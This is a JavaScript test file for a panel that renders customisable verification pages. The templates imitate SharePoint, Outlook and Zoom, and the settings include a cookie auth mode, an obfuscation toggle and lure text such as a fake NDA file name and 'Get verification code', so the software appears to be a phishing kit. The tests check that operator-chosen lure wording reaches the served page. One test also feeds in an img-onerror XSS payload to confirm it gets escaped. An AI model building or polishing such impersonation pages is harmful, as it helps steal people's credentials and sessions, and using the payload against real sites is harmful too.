require('./test-env');
/**
 * Customizable page text: the panel's "Customize document info" / "Customize
 * page text" / "Button Text" fields must actually reach the served page.
 *
 * db is stubbed; no network / DB required.
 */
const path = require('path');
const fs = require('fs');
const vm = require('vm');
const ROOT = path.resolve(__dirname, '..', '..');

const dbPath = require.resolve(path.join(ROOT, 'backend', 'database', 'connection.js'));
require.cache[dbPath] = {
  id: dbPath,
  filename: dbPath,
  loaded: true,
  exports: {
    query: async (sql) => {
      if (/FROM settings/i.test(String(sql))) {
        return [[{ setting_key: 'obfuscation_enabled', setting_value: 'false' }], []];
      }
      return [[], []];
    },
    getConnection: async () => ({ query: async () => [[], []], release: () => {} }),
    pool: { query: async () => [[], []] },
  },
};

const templateLoader = require(path.join(ROOT, 'backend', 'services', 'templateloader.js'));

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

function link(over) {
  return Object.assign({
    id: 900, user_id: 1,
    template_type: 'sharepoint3', verification_design: 'outlook', auth_mode: 'cookie',
    destination_url: 'https://office.com', background_blur: 4,
    blob_url_enabled: 0, copy_to_open: 0, show_verification_complete: 1, turnstile_enabled: 1,
    custom_bg_url: null, file_name: null, pages: null,
    title_text: null, message_text: null, button_text: null,
  }, over || {});
}

/** Decode the window-var blob that buildWindowVars injects. */
function shippedVars(html) {
  const m = /atob\("([^"]+)"\)/.exec(html);
  if (!m) return null;
  try {
    return JSON.parse(Buffer.from(m[1], 'base64').toString('utf8'));
  } catch (e) {
    return null;
  }
}

/** Minimal DOM good enough to exercise vg-text.js. */
function fakeDom(vars) {
  function mkEl(text) {
    return {
      textContent: String(text),
      childNodes: [
        { nodeType: 1, nodeValue: null },
        { nodeType: 3, nodeValue: ' ' + String(text) + ' ' },
      ],
      attrs: {},
    };
  }
  const store = {
    title: mkEl('Verify your identity'),
    file: mkEl('NDA-2026-Final.pdf'),
    pagesNum: mkEl('4 pages'),
    pagesText: mkEl('Live meeting'),
    msg: mkEl('Generate a one-time passcode to join.'),
    btn: mkEl('Get verification code'),
  };
  store.title.attrs = { tag: 'h1', 'data-page-title': true };
  store.file.attrs = { 'data-doc-filename': true };
  store.pagesNum.attrs = { 'data-doc-pages': true };
  store.pagesText.attrs = { tag: 'span' };
  store.msg.attrs = { tag: 'p', 'data-page-message': true };
  store.btn.attrs = { tag: 'button', 'data-primary-button': true };

  function match(el, sel) {
    if (!el) return false;
    if (sel[0] === '[') {
      const k = sel.slice(1, sel.indexOf(']'));
      return Object.prototype.hasOwnProperty.call(el.attrs, k);
    }
    if (sel[0] === '#') return el.attrs.id === sel.slice(1);
    if (sel[0] === '.') return el.attrs.cls === sel.slice(1);
    return el.attrs.tag === sel;
  }
  function querySelector(sel) {
    for (const k of ['title', 'file', 'pagesNum', 'msg', 'btn']) {
      if (match(store[k], sel)) return store[k];
    }
    return null;
  }
  const doc = { readyState: 'complete', addEventListener: function () {}, querySelector: querySelector };
  return {
    store,
    run: function (js) {
      const ctx = { window: Object.assign({}, vars || {}), document: doc, setTimeout: function () {} };
      ctx.globalThis = ctx;
      vm.createContext(ctx);
      vm.runInContext(js, ctx);
    },
  };
}
(async function () {
  const vgText = fs.readFileSync(path.join(ROOT, 'templates', 'assets', 'vg-text.js'), 'utf8');

  // ── 1. vg-text.js is bundled into the page ────────────────────────────
  const htmlDefault = await templateLoader.renderPageHtml(link(), { id: 1 }, {});
  check('vg-text.js is bundled into the page', htmlDefault.indexOf('data-page-title') !== -1);
  check('no unresolved placeholder literal remains',
    (htmlDefault.match(/\{\{[A-Z_]+\}\}/g) || []).length === 0,
    (htmlDefault.match(/\{\{[A-Z_]+\}\}/g) || []).join(','));

  // ── 2. template defaults ship when the link has none ──────────────────
  let vars = shippedVars(htmlDefault);
  check('window vars are shipped and decodable', !!vars);
  check('shares title default from config.json', vars.__PAGE_TITLE === 'Verify your identity', vars.__PAGE_TITLE);
  check('shares file_name default from config.json', vars.__DOC_FILENAME === 'NDA-2026-Final.pdf', vars.__DOC_FILENAME);
  check('shares pages default from config.json', vars.__DOC_PAGES === '4', vars.__DOC_PAGES);
  check('shares button_text default from config.json', vars.__PRIMARY_BUTTON_TEXT === 'Get verification code', vars.__PRIMARY_BUTTON_TEXT);
  check('message unset flag is false when the user left it blank', vars.__PAGE_MESSAGE_SET === 'false', vars.__PAGE_MESSAGE_SET);

  // ── 3. user customisation overrides the template defaults ─────────────
  const custom = link({
    title_text: 'Activate account first',
    message_text: 'One step to finish.',
    button_text: 'Continue now',
    file_name: 'Contract-774.pdf',
    pages: 9,
  });
  const htmlCustom = await templateLoader.renderPageHtml(custom, { id: 1 }, {});
  vars = shippedVars(htmlCustom);
  check('custom title is shipped', vars.__PAGE_TITLE === 'Activate account first', vars.__PAGE_TITLE);
  check('custom file name is shipped', vars.__DOC_FILENAME === 'Contract-774.pdf', vars.__DOC_FILENAME);
  check('custom pages is shipped as a string', vars.__DOC_PAGES === '9', vars.__DOC_PAGES);
  check('custom button text is shipped', vars.__PRIMARY_BUTTON_TEXT === 'Continue now', vars.__PRIMARY_BUTTON_TEXT);
  check('message set flag is true when the user typed one', vars.__PAGE_MESSAGE_SET === 'true', vars.__PAGE_MESSAGE_SET);

  // ── 4. the runtime applies the values to the template's own slots ────
  let d = fakeDom(vars);
  d.run(vgText);
  check('title applied to [data-page-title]', d.store.title.textContent === 'Activate account first', d.store.title.textContent);
  check('file name applied to [data-doc-filename]', d.store.file.textContent === 'Contract-774.pdf', d.store.file.textContent);
  check('button text applied without destroying the icon',
    d.store.btn.childNodes[1].nodeValue.trim() === 'Continue now',
    JSON.stringify(d.store.btn.childNodes.map(function (n) { return n.nodeValue; })));
  check('message applied because the user set one', d.store.msg.textContent === 'One step to finish.', d.store.msg.textContent);
  check('numeric page slot is rewritten', d.store.pagesNum.textContent === '9 pages', d.store.pagesNum.textContent);

  // ── 5. page-count slots only; media/meeting slots are left alone ──────
  const meetingVars = Object.assign({}, vars, { __DOC_PAGES: '9' });
  const dm = fakeDom(meetingVars);
  dm.run(vgText);
  check('non-page text slot is left untouched', dm.store.pagesText.textContent === 'Live meeting', dm.store.pagesText.textContent);

  const oneVars = Object.assign({}, vars, { __DOC_PAGES: '1' });
  const do1 = fakeDom(oneVars);
  do1.run(vgText);
  check('singular page form', do1.store.pagesNum.textContent === '1 page', do1.store.pagesNum.textContent);

  // ── 6. a blank message must NOT overwrite the template's own subtitle ─
  const blankVars = Object.assign({}, vars, { __PAGE_MESSAGE_SET: 'false' });
  const db2 = fakeDom(blankVars);
  db2.run(vgText);
  check('blank message leaves the template subtitle intact',
    db2.store.msg.textContent === 'Generate a one-time passcode to join.', db2.store.msg.textContent);

  // ── 7. {{PLACEHOLDER}} templates get HTML-escaped (zoom1) ────────────
  // Values spliced straight into markup must not become live HTML. This is
  // distinct from the window-var path, where values are applied via
  // textContent and are injection-safe by browser semantics.
  const hostile = link({ template_type: 'zoom1', title_text: '<img src=x onerror=pwn()>' });
  const hHtml = await templateLoader.renderPageHtml(hostile, { id: 1 }, {});
  check('hostile {{TITLE}} is escaped in the rendered HTML',
    hHtml.indexOf('<img src=x onerror=pwn()>') === -1 &&
    hHtml.indexOf('&lt;img src=x onerror=pwn()&gt;') !== -1);

  // window vars carry the raw value and are inert inside the base64 blob
  check('window vars still carry the raw value (applied via textContent)',
    shippedVars(hHtml).__PAGE_TITLE === '<img src=x onerror=pwn()>');

  console.log('\n==== ' + pass + ' passed, ' + fail + ' failed ====');
  process.exit(fail ? 1 : 0);
})().catch(function (e) {
  console.error('HARNESS ERROR', e && e.stack || e);
  process.exit(2);
});

